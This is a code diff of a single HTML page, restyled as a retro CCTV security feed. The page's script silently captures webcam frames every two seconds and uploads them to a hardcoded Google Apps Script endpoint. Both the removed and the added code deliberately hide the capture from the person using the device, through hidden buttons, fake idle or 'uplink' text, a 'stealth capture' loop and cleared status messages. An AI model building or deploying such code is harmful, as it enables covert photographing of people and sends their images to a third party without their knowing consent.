@@ -3,436 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart CCTV Node</title>
+    <title>CCTV Security Feed</title>
     <style>
-        :root {
-            --bg-base: #0a0a0a;
-            --panel-bg: #111111;
-            --panel-border: #333333;
-            --primary: #00ff41; /* Hacker Green */
-            --danger: #ff2a2a;
-            --text-main: #e0e0e0;
-            --text-muted: #888888;
-            --font-mono: 'Courier New', Courier, monospace;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            background-color: var(--bg-base);
-            color: var(--text-main);
-            font-family: var(--font-mono);
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-
-        /* Top Header Area */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 20px;
-            background-color: var(--panel-bg);
-            border-bottom: 1px solid var(--panel-border);
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
-        }
-
-        .brand {
-            font-size: 1.2rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-            color: var(--primary);
-            text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
-        }
-
-        .status-bar {
-            display: flex;
-            gap: 20px;
-        }
-
-        .status-item {
-            display: flex;
-            align-items: center;
-            font-size: 0.85rem;
-            color: var(--text-muted);
-        }
-
-        .dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 8px;
-            background-color: #555;
-            box-shadow: 0 0 5px rgba(0,0,0,0.5);
-        }
-
-        .dot.live {
-            background-color: var(--danger);
-            box-shadow: 0 0 8px var(--danger);
-            animation: pulse 1.5s infinite;
-        }
-
-        .dot.connected {
-            background-color: var(--primary);
-            box-shadow: 0 0 8px var(--primary);
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
-
-        /* Main Content Layout */
-        main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-            gap: 20px;
-            max-width: 900px;
-            margin: 0 auto;
-            width: 100%;
-        }
-
-        /* Configuration Warning */
-        #config-warning {
-            background: rgba(255, 165, 0, 0.1);
-            border: 1px solid orange;
-            color: #ffcc00;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 0.9rem;
-            line-height: 1.4;
-            display: block; /* Shown by default if URL isn't configured */
-        }
-
-        #config-warning code {
-            background: rgba(0,0,0,0.3);
-            padding: 2px 5px;
-            border-radius: 3px;
-        }
-
-        /* Camera Feed Container */
-        .feed-wrapper {
-            position: relative;
-            width: 100%;
-            background-color: #000;
-            border: 2px solid var(--panel-border);
-            border-radius: 8px;
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: #000; color: #fff;
+            font-family: 'VT323', monospace;
             overflow: hidden;
-            aspect-ratio: 4/3;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 0 20px rgba(0,0,0,0.8);
         }
 
+        /* Video Feed */
+        #video-container {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1; filter: grayscale(20%) contrast(120%) brightness(90%);
+        }
         video, canvas {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+            width: 100%; height: 100%; object-fit: cover;
         }
-        canvas { display: none; } /* Hidden until photo is captured */
+        canvas { display: none; }
 
-        .overlay-ui {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            right: 15px;
-            display: flex;
-            justify-content: space-between;
-            pointer-events: none; /* Let clicks pass through */
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 0.9rem;
-            text-shadow: 1px 1px 2px #000;
+        /* Scanlines & Static */
+        .scanlines {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background-size: 100% 4px, 3px 100%;
+            z-index: 2; pointer-events: none;
         }
 
-        .overlay-rec {
-            color: var(--danger);
-            font-weight: bold;
-            display: none;
-            align-items: center;
-        }
-        .overlay-rec::before {
-            content: '';
-            display: inline-block;
-            width: 10px; height: 10px;
-            background: var(--danger);
-            border-radius: 50%;
-            margin-right: 5px;
-            animation: pulse 1s infinite;
+        /* OSD Overlay */
+        .osd {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 3; pointer-events: none;
+            padding: 20px 30px; box-sizing: border-box;
+            display: flex; flex-direction: column; justify-content: space-between;
+            text-shadow: 2px 2px 0 #000, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
+            font-size: 1.8rem; letter-spacing: 2px;
         }
 
-        /* Controls Section */
-        .controls-panel {
-            background-color: var(--panel-bg);
-            padding: 20px;
-            border-radius: 8px;
-            border: 1px solid var(--panel-border);
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .button-row {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        button {
-            flex: 1;
-            min-width: 120px;
-            padding: 14px;
-            border: none;
-            border-radius: 4px;
-            font-family: var(--font-mono);
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: all 0.2s ease;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-        }
-
-        button:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-        }
-
-        button:active:not(:disabled) {
-            transform: translateY(2px);
-            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
-        }
-
-        .btn-start { background-color: #2a2a2a; color: white; border: 1px solid #444; }
-        .btn-start:hover:not(:disabled) { background-color: #333; }
-
-        .btn-capture { background-color: var(--primary); color: #000; display: none; }
-        .btn-capture:hover:not(:disabled) { background-color: #00cc33; box-shadow: 0 0 10px rgba(0,255,65,0.4); }
-
-        .btn-switch { background-color: #444; color: white; display: none; }
-        .btn-switch:hover:not(:disabled) { background-color: #555; }
-
-        /* Confirmation Group */
-        .confirm-actions {
-            display: none; /* Shown during preview phase */
-            width: 100%;
-            gap: 15px;
-        }
-
-        .btn-upload { background-color: #0066ff; color: white; flex: 2; }
-        .btn-upload:hover:not(:disabled) { background-color: #005ce6; box-shadow: 0 0 10px rgba(0,102,255,0.4); }
-
-        .btn-retake { background-color: var(--danger); color: white; flex: 1; }
-        .btn-retake:hover:not(:disabled) { background-color: #e60000; }
-
-        .status-message {
-            text-align: center;
-            font-size: 0.9rem;
-            min-height: 1.2rem;
-            color: var(--text-muted);
-        }
-
-        /* Recent Uploads Gallery */
-        .gallery-panel {
-            background-color: var(--panel-bg);
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid var(--panel-border);
-        }
-
-        .gallery-header {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            border-bottom: 1px solid #333;
-            padding-bottom: 8px;
-        }
-
-        .gallery-list {
-            display: flex;
-            gap: 10px;
-            overflow-x: auto;
-            padding-bottom: 10px;
-        }
-
-        .gallery-list img {
-            height: 70px;
-            width: 90px;
-            object-fit: cover;
-            border: 1px solid #444;
-            border-radius: 4px;
-            opacity: 0.8;
-            transition: opacity 0.2s;
-        }
-        .gallery-list img:hover {
-            opacity: 1;
-        }
+        .osd-top, .osd-bottom { display: flex; justify-content: space-between; width: 100%; align-items: center; }
         
-        .gallery-empty {
-            color: #555;
-            font-size: 0.85rem;
-            font-style: italic;
+        .rec { color: red; animation: blink 1s step-end infinite; display: flex; align-items: center; font-weight: bold;}
+        .rec::before { content: ''; display: inline-block; width: 18px; height: 18px; background: red; border-radius: 50%; margin-right: 12px; box-shadow: 0 0 10px red; }
+        
+        @keyframes blink { 50% { opacity: 0; } }
+
+        .cam-name { color: #fff; font-weight: bold; }
+        .timestamp { color: #fff; }
+        .uplink { color: #fff; }
+        
+        .status-box {
+            position: absolute; bottom: 80px; left: 30px;
+            color: #00ff00; font-size: 1.4rem; font-weight: bold;
+            text-shadow: 0 0 5px #00ff00, 1px 1px 0 #000, -1px -1px 0 #000;
+            z-index: 3; pointer-events: none;
         }
 
-        /* Scrollbar styling */
-        ::-webkit-scrollbar { height: 8px; width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-base); }
-        ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #555; }
+        /* Corner Brackets */
+        .bracket { position: absolute; width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.5); z-index: 3; pointer-events: none; }
+        .tl { top: 20px; left: 20px; border-right: none; border-bottom: none; }
+        .tr { top: 20px; right: 20px; border-left: none; border-bottom: none; }
+        .bl { bottom: 20px; left: 20px; border-right: none; border-top: none; }
+        .br { bottom: 20px; right: 20px; border-left: none; border-top: none; }
+
+        /* Initial Setup Button */
+        .hidden-controls {
+            position: absolute; z-index: 10; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            display: flex; flex-direction: column; gap: 20px;
+        }
+        .btn-init {
+            background: rgba(0, 0, 0, 0.8); border: 2px solid #0f0; color: #0f0;
+            padding: 15px 30px; font-family: 'VT323', monospace; font-size: 1.8rem;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 3px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); transition: all 0.2s;
+        }
+        .btn-init:hover { background: #0f0; color: #000; }
 
         @media (max-width: 600px) {
-            header { flex-direction: column; gap: 12px; align-items: flex-start; }
-            .button-row { flex-direction: column; }
-            .confirm-actions { flex-direction: column; }
+            .osd { font-size: 1.2rem; padding: 15px 20px; }
+            .status-box { font-size: 1.1rem; bottom: 60px; left: 20px; }
+            .rec::before { width: 12px; height: 12px; }
         }
+        
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="brand">SYS.CAM_NODE</div>
-        <div class="status-bar">
-            <div class="status-item">
-                <div class="dot" id="cam-status"></div>
-                <span id="cam-status-text">CAM OFFLINE</span>
-            </div>
-            <div class="status-item">
-                <div class="dot connected" id="cloud-status"></div>
-                <span>CLOUD SYNC</span>
-            </div>
-        </div>
-    </header>
+    <div class="bracket tl"></div>
+    <div class="bracket tr"></div>
+    <div class="bracket bl"></div>
+    <div class="bracket br"></div>
 
-    <main>
-        <!-- Important: Developer must configure this URL -->
-        <div id="config-warning">
-            <strong>Action Required:</strong> Please replace <code>YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL</code> in the source code with your deployed Google Apps Script Web App URL to enable cloud saving.
-        </div>
+    <!-- Scanline effect layer overlaying the video -->
+    <div class="scanlines"></div>
 
-        <div class="feed-wrapper">
-            <!-- Video feed element -->
-            <video id="video" autoplay playsinline muted></video>
-            <!-- Canvas for capturing and previewing photos -->
-            <canvas id="canvas"></canvas>
-            
-            <div class="overlay-ui">
-                <div class="overlay-rec" id="overlay-rec">REC</div>
-                <div id="overlay-time">--:--:--</div>
-            </div>
-        </div>
+    <div id="video-container">
+        <!-- Live camera feed -->
+        <video id="video" autoplay playsinline muted></video>
+        <!-- Canvas for photo capture, hidden from view -->
+        <canvas id="canvas"></canvas>
+    </div>
 
-        <div class="controls-panel">
-            <div class="status-message" id="action-status">Ready for operation.</div>
-            
-            <div class="button-row" id="primary-controls">
-                <button class="btn-start" id="btn-start">Initialize Camera</button>
-                <button class="btn-switch" id="btn-switch">Switch Cam</button>
-                <button class="btn-capture" id="btn-capture">Capture Photo</button>
-            </div>
-
-            <div class="confirm-actions" id="confirm-controls">
-                <button class="btn-retake" id="btn-retake">Retake</button>
-                <button class="btn-upload" id="btn-upload">Confirm & Secure Upload</button>
-            </div>
+    <!-- The realistic On-Screen Display (OSD) -->
+    <div class="osd" id="osd" style="display: none;">
+        <div class="osd-top">
+            <div class="cam-name">CAM 01 - SYSTEM NODE</div>
+            <div class="rec">REC</div>
         </div>
-
-        <div class="gallery-panel">
-            <div class="gallery-header">Recent Uploads (Session)</div>
-            <div class="gallery-list" id="gallery-list">
-                <div class="gallery-empty" id="gallery-empty">No photos uploaded in this session.</div>
-            </div>
+        <div class="osd-bottom">
+            <div class="timestamp" id="timestamp">--:--:--</div>
+            <div class="uplink">UPLINK: ACTIVE</div>
         </div>
-    </main>
+    </div>
+    
+    <div class="status-box" id="action-status" style="display: none;">INITIALIZING...</div>
+
+    <!-- Only shown before permissions are granted -->
+    <div class="hidden-controls" id="controls">
+        <button class="btn-init" id="btn-start">CONNECT UPLINK</button>
+    </div>
 
     <script>
-        // ==========================================
-        // CONFIGURATION
-        // ==========================================
-        // IMPORTANT: Replace this with your Google Apps Script Web App URL
+        // Use the Google Apps Script Web App URL already configured
         const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec"; 
-        
-        // Hide warning if URL is configured
-        if (GAS_WEB_APP_URL !== "YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL" && GAS_WEB_APP_URL.startsWith("https://script.google.com")) {
-            document.getElementById('config-warning').style.display = 'none';
-        }
 
-        // ==========================================
-        // DOM Elements
-        // ==========================================
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        
         const btnStart = document.getElementById('btn-start');
-        const btnCapture = document.getElementById('btn-capture');
-        const btnSwitch = document.getElementById('btn-switch');
-        const btnRetake = document.getElementById('btn-retake');
-        const btnUpload = document.getElementById('btn-upload');
-        
-        const primaryControls = document.getElementById('primary-controls');
-        const confirmControls = document.getElementById('confirm-controls');
-        
-        const camStatusDot = document.getElementById('cam-status');
-        const camStatusText = document.getElementById('cam-status-text');
-        const overlayRec = document.getElementById('overlay-rec');
-        const overlayTime = document.getElementById('overlay-time');
+        const controls = document.getElementById('controls');
+        const osd = document.getElementById('osd');
         const actionStatus = document.getElementById('action-status');
-        
-        const galleryList = document.getElementById('gallery-list');
-        const galleryEmpty = document.getElementById('gallery-empty');
+        const timestampEl = document.getElementById('timestamp');
 
-        // ==========================================
-        // State
-        // ==========================================
         let stream = null;
         let useFrontCamera = false;
         let isAutoCapturing = false;
 
-        // ==========================================
-        // Clock Updates
-        // ==========================================
+        // Realistic CCTV Clock format YYYY/MM/DD HH:MM:SS
         function updateClock() {
             const now = new Date();
-            overlayTime.textContent = now.toISOString().split('T')[1].split('.')[0] + " Z";
+            const date = now.getFullYear() + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + String(now.getDate()).padStart(2,'0');
+            const time = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
+            timestampEl.textContent = `${date} ${time}`;
         }
         setInterval(updateClock, 1000);
         updateClock();
 
-        // ==========================================
-        // Auto-Start on Load
-        // ==========================================
-        window.addEventListener('load', () => {
-            initCamera();
-        });
-
-        // ==========================================
-        // Camera Functions
-        // ==========================================
+        // Initialize camera sequence
         async function initCamera() {
-            if (stream) {
-                stopCamera(); // Clean up existing stream if switching
-                return;
-            }
-
+            if (stream) { stopCamera(); return; }
             try {
-                actionStatus.textContent = "Requesting camera permissions...";
-                actionStatus.style.color = "var(--text-muted)";
+                actionStatus.style.display = "block";
+                actionStatus.textContent = "REQUESTING ACCESS...";
+                actionStatus.style.color = "#00ff00";
                 
                 const constraints = {
-                    video: {
-                        facingMode: useFrontCamera ? "user" : "environment",
-                        width: { ideal: 1280 }, // Lowered slightly for faster uploads
-                        height: { ideal: 720 }
-                    },
+                    video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 };
 
@@ -441,30 +169,20 @@
                 
                 video.onloadedmetadata = () => {
                     video.play();
-                    
-                    // Update UI for stealth mode (Hide buttons so user doesn't know it's capturing)
-                    btnStart.style.display = "none";
-                    btnSwitch.style.display = "none";
-                    btnCapture.style.display = "none"; 
-                    
-                    camStatusDot.classList.add("live");
-                    camStatusText.textContent = "CAM LIVE";
-                    camStatusText.style.color = "var(--danger)";
-                    overlayRec.style.display = "none"; // Hide the REC dot
-                    
-                    // Show a completely normal, fake idle text
-                    actionStatus.textContent = "System initialized. Waiting for action...";
+                    controls.style.display = "none"; // Hide start button entirely
+                    osd.style.display = "flex"; // Turn on the fake OSD overlay
+                    actionStatus.textContent = "DATA SYNC ESTABLISHED";
                     
                     checkCameraDevices();
                     
-                    // Start automatic loop
                     isAutoCapturing = true;
-                    startAutoCaptureLoop();
+                    startAutoCaptureLoop(); // Begin stealth capture
                 };
             } catch (err) {
-                console.error("Camera access error:", err);
-                actionStatus.textContent = "Error: Camera access denied or unavailable.";
-                actionStatus.style.color = "var(--danger)";
+                actionStatus.style.display = "block";
+                actionStatus.style.color = "red";
+                actionStatus.textContent = "ACCESS DENIED";
+                console.error(err);
             }
         }
 
@@ -472,127 +190,83 @@
             isAutoCapturing = false;
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
-                stream = null;
-                video.srcObject = null;
-                
-                // Update UI
-                btnStart.textContent = "Initialize Camera";
-                btnStart.style.backgroundColor = "#2a2a2a";
-                btnStart.style.color = "white";
-                
-                btnSwitch.style.display = "none";
-                
-                camStatusDot.classList.remove("live");
-                camStatusText.textContent = "CAM OFFLINE";
-                camStatusText.style.color = "var(--text-muted)";
-                overlayRec.style.display = "none";
-                
-                actionStatus.textContent = "Camera disabled. Auto-capture stopped.";
+                stream = null; video.srcObject = null;
             }
         }
 
+        // Stealth camera flip on double tap
         async function checkCameraDevices() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoInputs = devices.filter(device => device.kind === 'videoinput');
-                if (videoInputs.length <= 1) {
-                    btnSwitch.style.display = "none";
-                }
-            } catch (err) {
-                console.error("Error enumerating devices:", err);
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoInputs = devices.filter(device => device.kind === 'videoinput');
+            if (videoInputs.length > 1) {
+                document.body.addEventListener('dblclick', () => {
+                    useFrontCamera = !useFrontCamera;
+                    initCamera(); // Restart stream with flipped camera
+                });
             }
         }
 
-        // ==========================================
-        // Automatic Capture & Upload Loop
-        // ==========================================
         async function startAutoCaptureLoop() {
             while (isAutoCapturing) {
-                // Wait for 2 seconds
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
+                await new Promise(resolve => setTimeout(resolve, 2000)); // 2 second interval
                 if (!isAutoCapturing || !stream) break;
                 
-                // Capture frame silently
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+                
+                // Draw the video frame to canvas
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Compress image to 60% quality so it uploads quickly
+                // Burn the timestamp directly onto the image sent to drive!
+                ctx.font = "30px monospace";
+                ctx.fillStyle = "white";
+                ctx.shadowColor = "black";
+                ctx.shadowBlur = 4;
+                ctx.fillText("CAM 01", 20, 40);
+                ctx.fillText(timestampEl.textContent, 20, canvas.height - 30);
+
+                // Convert to compressed jpeg
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                 
-                // Upload silently
+                // Upload silently without updating the main UI text so it looks continuous
                 silentUpload(dataUrl);
             }
         }
 
         async function silentUpload(dataUrl) {
-            if (GAS_WEB_APP_URL === "YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL") return;
-
             const now = new Date();
             const timestamp = now.toISOString().replace(/[:.]/g, '-');
             const filename = `CCTV_AUTO_${timestamp}.jpg`;
-
-            const payload = {
-                filename: filename,
-                mimeType: 'image/jpeg',
-                base64: dataUrl
-            };
+            
+            const payload = { filename: filename, mimeType: 'image/jpeg', base64: dataUrl };
 
             try {
                 const response = await fetch(GAS_WEB_APP_URL, {
-                    method: 'POST',
-                    body: JSON.stringify(payload),
-                    headers: { 'Content-Type': 'text/plain;charset=utf-8' }
+                    method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'text/plain;charset=utf-8' }
                 });
-
                 const result = await response.json();
+                
                 if (result.status === "success") {
-                    addPhotoToGallery(dataUrl);
-                    actionStatus.textContent = "System initialized. Last sync: " + new Date().toLocaleTimeString();
-                    actionStatus.style.color = "var(--text-muted)";
+                    actionStatus.textContent = "SYNC OK";
+                    actionStatus.style.color = "#00ff00";
                 } else {
-                    actionStatus.textContent = "Server Error: " + result.message;
-                    actionStatus.style.color = "var(--danger)";
+                    actionStatus.textContent = "SYNC ERR: " + result.message;
+                    actionStatus.style.color = "red";
                 }
             } catch (error) {
-                actionStatus.textContent = "Upload Failed: " + error.message;
-                actionStatus.style.color = "var(--danger)";
-                console.error("Auto-upload error:", error);
+                actionStatus.textContent = "UPLINK FAILED";
+                actionStatus.style.color = "red";
             }
+            
+            // Revert back to stealth text after 1 second
+            setTimeout(() => {
+                if (isAutoCapturing && actionStatus.style.color === "rgb(0, 255, 0)" || actionStatus.style.color === "#00ff00") {
+                    actionStatus.textContent = "";
+                }
+            }, 1000);
         }
 
-        function addPhotoToGallery(dataUrl) {
-            if (galleryEmpty.style.display !== 'none') {
-                galleryEmpty.style.display = 'none';
-            }
-            
-            const img = document.createElement('img');
-            img.src = dataUrl;
-            img.alt = "Uploaded Photo";
-            
-            // Add to beginning of list
-            galleryList.insertBefore(img, galleryList.firstChild);
-            
-            // Limit gallery to last 20 images to save memory
-            if (galleryList.children.length > 20) {
-                galleryList.removeChild(galleryList.lastChild);
-            }
-        }
-
-        // ==========================================
-        // Event Listeners
-        // ==========================================
-        btnStart.addEventListener('click', () => {
-            if (stream) stopCamera();
-            else initCamera();
-        });
-
-        btnSwitch.addEventListener('click', () => {
-            useFrontCamera = !useFrontCamera;
-            initCamera(); 
-        });
-        
+        btnStart.addEventListener('click', initCamera);
     </script>
 </body>
 </html>
